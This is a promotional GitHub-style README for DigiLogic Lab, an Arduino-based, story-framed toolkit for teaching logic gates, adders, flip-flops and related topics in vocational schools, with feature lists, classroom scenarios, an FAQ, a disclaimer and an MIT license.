![preview](https://raw.githubusercontent.com/cvsinghjodha15/Logic-Lab-Arduino/main/cover_9554c3.svg)
[![Download](https://raw.githubusercontent.com/cvsinghjodha15/Logic-Lab-Arduino/main/latest_d497bb.svg)](https://cvsinghjodha15.github.io/Logic-Lab-Arduino/)

# ⚡ DigiLogic Lab — Interactive Digital Electronics Trainer for Arduino

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Arduino-00979D?style=for-the-badge&logo=arduino&logoColor=white" alt="Arduino Platform" />
  <img src="https://img.shields.io/badge/Category-Educational%20Toolkit-blueviolet?style=for-the-badge" alt="Educational Toolkit" />
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="MIT License" />
  <img src="https://img.shields.io/badge/Status-Actively%20Maintained-brightgreen?style=for-the-badge" alt="Maintained" />
  <img src="https://img.shields.io/badge/Language-C%2B%2B%20%7C%20Python%20%7C%20JS-orange?style=for-the-badge" alt="Languages" />
  <img src="https://img.shields.io/badge/Target-Vocational%20School-9cf?style=for-the-badge" alt="Target Audience" />
  <img src="https://img.shields.io/badge/Release-2026-red?style=for-the-badge" alt="Release 2026" />
  <img src="https://img.shields.io/badge/Support-24%2F7-ff69b4?style=for-the-badge" alt="Support" />
</p>

---

## 🧠 What Is DigiLogic Lab?

**DigiLogic Lab** is an open, modular teaching companion that transforms a humble Arduino board into a living, breathing laboratory for **digital electronics fundamentals**. Where a textbook shows truth tables on paper, DigiLogic Lab **makes the bits blink, count, add, compare, and speak**.

This is the successor concept born from the spirit of the original Arduino-Trainer-Elektronika-Digital — but reimagined from scratch as a **narrative-first learning ecosystem**. Instead of handing students a static schematic, DigiLogic Lab builds a small **story world** called *Bitland*, where every logic gate is a character, every flip-flop is a memory keeper, and every adder is an accountant gnome who never loses a carry.

Teachers get a fully scripted journey. Students get a tactile, sensory playground. Everyone gets a clearer mental model of how digital machines actually think.

The project is built for **vocational high school environments** (SMK, technical colleges, polytechnics) and is designed to survive real classroom chaos: loose jumper wires, curious fingers, sudden bell rings, and a projector that only works on Tuesdays.

---

## 🎯 Why This Project Exists

Digital electronics is one of the hardest topics to teach purely on a whiteboard because it is fundamentally **invisible**. Currents become numbers, numbers become voltage thresholds, thresholds become Boolean decisions, and decisions cascade into computation. Students often memorize the truth table of a NAND gate without ever *feeling* why it matters.

DigiLogic Lab flips the order of learning:

1. **Play first** — the student sees LEDs react.
2. **Question next** — the teacher asks "why did that LED turn off?"
3. **Theory last** — the truth table becomes a *summary* of an experience, not a replacement for it.

This ordering is called **Experiential-First Didactics**, and DigiLogic Lab is built entirely around it.

---

## ✨ Feature Highlights

### 🎛️ Interactive Hardware Bridge
A thin, handshakable firmware layer that exposes the Arduino's digital pins as named "bricks" — `AND_Brick`, `OR_Brick`, `XOR_Brick`, `Adder_Brick`, `Comparator_Brick`, `Encoder_Brick`, `Decoder_Brick`, `Multiplexer_Brick`. Teachers can compose lessons by snapping bricks together in the companion desktop panel.

### 🧩 Lesson Composer (No-Code)
Drag, drop, and sequence lessons into a storyboard. Each lesson includes a **prompt card**, an **expected behavior**, a **concept reveal**, and an optional **quiz spike**. No coding required to author new modules.

### 🌐 Multilingual Support
All teacher-facing prompts, quiz items, and student hints ship with **Indonesian, English, and Javanese** as baseline locales. The localization engine is key-value JSON based, so any school can add a regional language in under an hour.

### 📱 Responsive UI
The companion web panel reshapes itself from a classroom projector to a lab tablet to a smartphone without losing a single control. Teachers can preview a lesson on their phone while walking between benches.

### 🔁 Live Bit Inspector
A real-time oscilloscope-lite view of every digital line, rendered as a horizontal strip of colored cells. Rising edges flash. Falling edges fade. Students literally *see* transitions they previously only imagined.

### 🧮 Built-In Simulator Mode
When hardware is scarce, DigiLogic Lab falls back to a pure simulation layer that mimics every brick's behavior. Teachers can assign homework that runs identically on a laptop or on a bench.

### 🧭 Guided Narrative Mode ("Bitland")
A story overlay that frames each lesson as a chapter. Alice the AND gate, Oscar the OR gate, and Xena the XOR gate guide the student through a friendly kingdom of binary logic.

### 🛠️ Teacher Dashboard
Attendance-friendly session tracking, per-student progress arcs, and a "class pulse" panel showing which brick is currently the class-wide bottleneck.

### 🧪 Autograder for Lab Reports
Students paste their observed outputs; the autograder compares them against expected vectors and returns a friendly, non-punitive diff view.

### 🕒 24/7 Customer Support
A rotating support channel with asynchronous ticket intake and a human-in-the-loop response model. Weekends and holidays are covered by a volunteer mentor roster from partner vocational schools.

### 🎨 Theme Engine
Light, dark, high-contrast, and dyslexia-friendly typography modes. Classrooms have windows; windows have glare; DigiLogic Lab respects that.

---

## 🧱 Brick Library — Deep Dive

| Brick | Emoji | Teaching Focus | Typical Demo |
|-------|-------|----------------|--------------|
| Number System Brick | 🔢 | Binary, octal, hex, BCD | LED bar counts 0000 → 1111 |
| Logic Gate Brick | 🚪 | AND, OR, NOT, NAND, NOR, XOR, XNOR | Two-button truth table |
| Adder Brick | ➕ | Half adder, full adder, ripple carry | Two 4-bit numbers sum on LEDs |
| Comparator Brick | ⚖️ | Equality, magnitude compare | A>B, A=B, A<B indicators |
| Encoder Brick | 🗜️ | 4-to-2, 8-to-3 priority | Button press becomes a code |
| Decoder Brick | 🗝️ | 2-to-4, 3-to-8 | Code becomes a single lit LED |
| Multiplexer Brick | 🔀 | 2:1, 4:1, 8:1 data select | Swap two sensor streams live |
| Demultiplexer Brick | 🧲 | One-to-many routing | Fan-out demo |
| Flip-Flop Brick | 🪞 | SR, D, JK, T | A single bit that remembers |
| Register Brick | 🗄️ | 4-bit, 8-bit parallel load | Shift a pattern left and right |
| Counter Brick | 🧮 | Ripple, synchronous, up/down | Automatic 0–15 cycling |
| Memory Brick | 💾 | ROM-style lookup table | Encode a small melody |

Each brick has a **teacher script**, a **student worksheet**, a **wiring diagram description**, and a **narrative vignette** featuring a Bitland character.

---

## 🏫 Classroom Deployment Scenarios

**Scenario A — One Bench, One Board.**
A single Arduino Uno sits at the front of the room. The teacher runs the lesson on a projector. Students call out predictions before each LED change. The whole class learns from one board.

**Scenario B — Rotating Stations.**
Six benches, six boards, six bricks. Groups rotate every 15 minutes. The Teacher Dashboard shows which station is lagging and pushes a hint.

**Scenario C — Hybrid Homework.**
Class learns on hardware. Homework runs on the simulator. Same lesson files. Same expected outputs. Zero cognitive friction.

**Scenario D — Assessment Week.**
The autograder generates a variant of each brick lesson with shuffled inputs. Students cannot memorize; they must reason.

---

## 🧑‍🏫 For Teachers — A Day in the Life

You walk in at 07:10. You plug in the board. You open the Teacher Dashboard. Yesterday's class left off at *Flip-Flop Brick, chapter 3*. You press **Resume**. The projector shows Xena the XOR gate waving goodbye as the memory keeper steps forward. Students sit down. You ask the first question. The first LED blinks. The room leans in. That is the whole point.

No lesson plan rewriting. No searching for the right slide. The narrative carries the pacing so you can spend your attention on the humans.

---

## 🧑‍🎓 For Students — What You Actually Do

You press buttons. You watch lights. You guess what happens next. Sometimes you are wrong, and that is *the best moment of the lesson*. The Bit Inspector replays the last five seconds so you can rewind the surprise and inspect it.

You do not need to know C++. You do not need to know how a transistor works. You need curiosity, and a willingness to press the wrong button on purpose just to see what the machine does.

---

## 🧬 Project Architecture (Conceptual)

The system is layered like a stack of transparent cards:

- **Layer 1 — Firmware.** Runs on the Arduino. Exposes a small command vocabulary: `SET_BRICK`, `READ_LINE`, `PULSE`, `STREAM`. Tiny, boring, reliable.
- **Layer 2 — Bridge.** Talks to the board over serial or Wi-Fi. Normalizes timing. Buffers bursts. Never blocks the UI.
- **Layer 3 — Brick Engine.** Pure logic. Knows what an AND gate *means*, independent of hardware. This is what makes simulation mode possible.
- **Layer 4 — Lesson Composer.** Declarative lesson files. Human-readable. Diffable in version control.
- **Layer 5 — Narrative Layer.** Story skins, character dialogue, localization strings.
- **Layer 6 — UI Shell.** Responsive, themeable, accessible.

Because Layer 3 is hardware-independent, the same lesson runs on a real board, a clone, or a bare laptop. Teachers never get locked into a specific vendor.

---

## 🔌 Hardware Compatibility

- Arduino Uno, Nano, Mega 2560 (baseline)
- Arduino Leonardo, Micro (HID-friendly variants)
- ESP32 and ESP8266 (for Wi-Fi-enabled classrooms)
- Raspberry Pi Pico (via a compatibility shim)
- Compatible clones are welcome; the firmware avoids vendor-specific timing tricks

The project deliberately targets **low-cost, widely available boards** because the goal is classroom reach, not hardware prestige.

---

## 🧪 Testing Strategy

- **Unit tests** for every brick's boolean behavior
- **Golden-vector tests** for adders, comparators, encoders, decoders
- **Timing tolerance tests** that simulate noisy jumper wires
- **Localization coverage checks** ensuring every visible string exists in every shipped locale
- **Accessibility audits** for contrast, focus order, and screen-reader labels
- **Regression snapshots** for the narrative layer so stories don't silently drift

Testing is treated as a first-class citizen because teachers cannot afford flaky tools.

---

## 🔐 Privacy and Student Data

DigiLogic Lab stores progress **locally by default**. Cloud sync is optional and opt-in. No third-party analytics are bundled. No student identifiers leave the classroom unless an administrator explicitly configures a school-managed sync endpoint. The project's stance is simple: a learning tool should not become a surveillance tool.

---

## 🗺️ Roadmap 2026

- **Q1 2026** — Brick Library v2 with formal timing specs and expanded simulation fidelity
- **Q2 2026** — Lesson Composer with collaborative editing for teacher teams
- **Q3 2026** — Offline-first mobile companion for Android and iOS
- **Q4 2026** — National curriculum mapping packs for multiple vocational systems
- **Continuous** — Community-contributed narrative chapters and translations

---

## 🤝 Contributing

Contributions are welcome from teachers, students, hobbyists, and engineers. The most valuable contributions are often **not code** — they are lesson scripts, translations, wiring photos (described in words for accessibility), and classroom stories.

Please open an issue before starting a large change so the maintainers can help shape it. Small, focused pull requests are preferred over sweeping rewrites. Every contribution is reviewed by at least one educator and one engineer.

---

## 🧭 SEO-Friendly Topic Coverage

This repository and its documentation are written to be discoverable by educators searching for practical, classroom-ready material. Naturally integrated topics include: digital electronics trainer, Arduino teaching kit, logic gate demonstration, number system visualization, adder and comparator lab, encoder decoder project, multiplexer lesson plan, vocational high school electronics, interactive learning media, STEM classroom toolkit, hands-on Boolean logic, binary counter demo, flip-flop teaching aid, and multilingual educational software.

---

## 📚 Documentation Map

- **Getting Started** — a walking tour of the panel from a teacher's perspective
- **Brick Reference** — behavior, wiring intent, expected outputs
- **Lesson Authoring** — how to write a lesson file in fifteen minutes
- **Localization Guide** — adding a new language without touching code
- **Hardware Notes** — pin maps, voltage cautions, clone quirks
- **Troubleshooting** — the ten most common classroom mysteries, explained
- **FAQ** — questions teachers actually ask
- **Changelog** — what changed, why it changed, who asked for it

---

## ❓ Frequently Asked Questions

**Is this only for Arduino?**
No. Arduino is the baseline, but the Brick Engine runs on any platform that can be wrapped by a thin bridge. Ports exist for ESP and Pico, and more are welcome.

**Do I need internet in class?**
No. The entire experience runs offline. Internet is only needed for optional sync and for pulling updates.

**Can students install this themselves?**
Yes, and many do. The setup is designed to be gentle for a first-time user.

**Is the narrative childish?**
Only if you want it to be. Narrative Mode can be disabled, and the plain technical mode is fully featured.

**Does it work with a projector and a tablet at once?**
Yes. The responsive UI adapts per viewport. Multiple viewers can watch the same session.

---

## ⚠️ Disclaimer

DigiLogic Lab is an **educational aid**. It is not a substitute for a qualified teacher, a formal curriculum, or a certified electronics safety course. Always follow proper electrical safety practices when working with any microcontroller, breadboard, or power supply.

The maintainers are not responsible for:

- Damaged components caused by incorrect wiring, overvoltage, or reversed polarity
- Classroom accidents arising from neglect of standard lab safety procedures
- Curriculum decisions made by institutions using this tool
- Any loss of data resulting from unverified cloud sync configuration
- Misinterpretation of simulated behavior as identical to real hardware under all conditions

Simulation mode is an approximation. Real hardware has tolerances, parasitic capacitance, and opinions of its own. Teach students to respect the difference.

Support availability is described as 24/7 in intent, but actual response times depend on the volunteer mentor roster and regional holidays. No guaranteed SLA is implied.

---

## 📄 License

This project is released under the **MIT License**. You are welcome to use, study, modify, and share it, including in commercial and institutional settings, provided the original license notice is preserved.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 DigiLogic Lab Contributors

---

## 🌟 Final Word

Digital electronics does not have to be a wall of symbols. It can be a room full of blinking lights, a story about tiny logic creatures, and a teacher who finally gets to say, *"Watch what happens when I press this."*

DigiLogic Lab exists so that moment happens more often. Build it with us. Teach with it. Break it, fix it, translate it, and hand it to the next classroom down the hall.

[![Download](https://raw.githubusercontent.com/cvsinghjodha15/Logic-Lab-Arduino/main/latest_d497bb.svg)](https://cvsinghjodha15.github.io/Logic-Lab-Arduino/)